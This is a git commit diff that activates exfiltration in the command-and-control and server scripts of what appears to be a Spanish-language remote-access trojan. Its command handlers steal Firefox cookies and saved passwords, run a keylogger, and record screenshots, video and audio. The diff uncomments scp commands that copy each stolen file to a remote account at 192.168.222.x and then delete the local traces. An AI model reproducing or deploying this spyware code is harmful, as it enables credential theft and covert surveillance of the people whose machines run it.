fc37aa83fef373235c618d7aa729c048eacd7b80
nmoralesbec <nayemoralesp@hotmail.com>
2015-07-03 12:15:41 -0500

    cambios de usuario a manavi

--- candc.py
+++ candc.py
@@ -30,39 +30,39 @@ os.system("rm -f /tmp/comandos")
 for c in comandos:
     if c == "cookies":
        		os.system("python firecookies.py")	
-                #os.system('scp /tmp/cookies.txt manavi@192.168.222.13:~/cookies 1>/dev/null')
-                #os.system('rm -f /tmp/cookies.txt')
+                os.system('scp /tmp/cookies.txt manavi@192.168.222.13:~/cookies 1>/dev/null')
+                os.system('rm -f /tmp/cookies.txt')
 
     elif c == "contrasenas":
        		os.system("python firepass.py")
-                #os.system('scp /tmp/firepass.txt manavi@192.168.222.13:~/contrasenas 1>/dev/null')
-                #os.system('rm -f /tmp/firepass.txt')
+                os.system('scp /tmp/firepass.txt manavi@192.168.222.13:~/contrasenas 1>/dev/null')
+                os.system('rm -f /tmp/firepass.txt')
 
     elif re.search('keylogger',c):
                 mo = re.match('keylogger (\d+)',c)
         
         	keylogger.keylog(mo.group(1))
-                #os.system('scp /tmp/key.txt manavi@192.168.222.13:~/keylogger 1>/dev/null')
-                #os.system('rm -f /tmp/key.txt')
+                os.system('scp /tmp/key.txt manavi@192.168.222.13:~/keylogger 1>/dev/null')
+                os.system('rm -f /tmp/key.txt')
     
     elif re.search('captura',c):
                 mo = re.match('captura ([tn]{1,1}) (\d+)',c);
                 captura.tiempo(mo.group(1),mo.group(2))
-                #os.system('scp /tmp/*.jpg manavi@192.168.222.13:~/capturas 1>/dev/null')
-                #os.system('rm -f /tmp/*.jpg')
+                os.system('scp /tmp/*.jpg manavi@192.168.222.13:~/capturas 1>/dev/null')
+                os.system('rm -f /tmp/*.jpg')
 
  
     elif re.search('captvid',c):
                 mo = re.match('captvid (\d+)',c);
-                #os.system('scp /tmp/*.avi manavi@192.168.222.13:~/video 1>/dev/null')
-                #os.system('rm -f /tmp/*.avi')
+                os.system('scp /tmp/*.avi manavi@192.168.222.13:~/video 1>/dev/null')
+                os.system('rm -f /tmp/*.avi')
     
     elif re.search('captaud',c):
                 mo = re.match('captaud (\d+)',c);
         
                 capaudio.audio(mo.group(1))
-                #os.system('scp /tmp/*.wav manavi@192.168.222.13:~/audio 1>/dev/null')
-                #os.system('rm -f /tmp/*.wav')
+                os.system('scp /tmp/*.wav manavi@192.168.222.13:~/audio 1>/dev/null')
+                os.system('rm -f /tmp/*.wav')
 
     #si el comando no es valido no se manda un archivo con los comandos no validos
     else :
@@ -72,5 +72,5 @@ for c in comandos:
 
 
 if os.path.exists("/tmp/comandosnovalidos")
-	#os.system('scp /tmp/comandosnovalidos.txt manavi@192.168.222.13:~/error 1>/dev/null')
-	#os.system('rm -f /tmp/comandosnovalidos.txt')
+	os.system('scp /tmp/comandosnovalidos.txt manavi@192.168.222.13:~/error 1>/dev/null')
+	os.system('rm -f /tmp/comandosnovalidos.txt')
--- server.py
+++ server.py
@@ -43,43 +43,43 @@ while True:
     
     if recibido == "cookies":
        		os.system("python firecookies.py")	
-                #os.system('scp /tmp/cookies.txt manavi@192.168.222.9:~/cookies 1>/dev/null')
-                #os.system('rm -f /tmp/cookies.txt')
+                os.system('scp /tmp/cookies.txt manavi@192.168.222.9:~/cookies 1>/dev/null')
+                os.system('rm -f /tmp/cookies.txt')
                 connstream.send("Archivo enviado")
 
     elif recibido == "contrasenas":
        		os.system("python firepass.py")
-                #os.system('scp /tmp/firepass.txt manavi@192.168.222.9:~/contrasenas 1>/dev/null')
-                #os.system('rm -f /tmp/firepass.txt')
+                os.system('scp /tmp/firepass.txt manavi@192.168.222.9:~/contrasenas 1>/dev/null')
+                os.system('rm -f /tmp/firepass.txt')
         	connstream.send("Archivo enviado")
 
     elif re.search('keylogger',recibido):
                 mo = re.match('keylogger (\d+)',recibido)
         	keylogger.keylog(mo.group(1))
-                #os.system('scp /tmp/key.txt manavi@192.168.222.9:~/keylogger 1>/dev/null')
-                #os.system('rm -f /tmp/key.txt')
+                os.system('scp /tmp/key.txt manavi@192.168.222.9:~/keylogger 1>/dev/null')
+                os.system('rm -f /tmp/key.txt')
         	connstream.send("Archivo enviado")
     
     elif re.search('captura',recibido):
                 mo = re.match('captura ([tn]{1,1}) (\d+)',recibido);
                 captura.tiempo(mo.group(1),mo.group(2))
-                #os.system('scp /tmp/*.jpg manavi@192.168.222.9:~/capturas 1>/dev/null')
-                #os.system('rm -f /tmp/*.jpg')
+                os.system('scp /tmp/*.jpg manavi@192.168.222.9:~/capturas 1>/dev/null')
+                os.system('rm -f /tmp/*.jpg')
         	connstream.send("Archivo enviado")
 
  
     elif re.search('captvid',recibido):
                 mo = re.match('captvid (\d+)',recibido);
                 capvideo.video(mo.group(1))
-                #os.system('scp /tmp/*.avi manavi@192.168.222.9:~/video 1>/dev/null')
-                #os.system('rm -f /tmp/*.avi')    
+                os.system('scp /tmp/*.avi manavi@192.168.222.9:~/video 1>/dev/null')
+                os.system('rm -f /tmp/*.avi')    
         	connstream.send("Archivo enviado")
     
     elif re.search('captaud',recibido):
                 mo = re.match('captaud (\d+)',recibido);        
                 capaudio.audio(mo.group(1))
-                #os.system('scp /tmp/*.wav manavi@192.168.222.9:~/audio 1>/dev/null')
-                #os.system('rm -f /tmp/*.wav')
+                os.system('scp /tmp/*.wav manavi@192.168.222.9:~/audio 1>/dev/null')
+                os.system('rm -f /tmp/*.wav')
         	connstream.send("Archivo enviado")
 
     #Devolvemos el mensaje de error al cliente
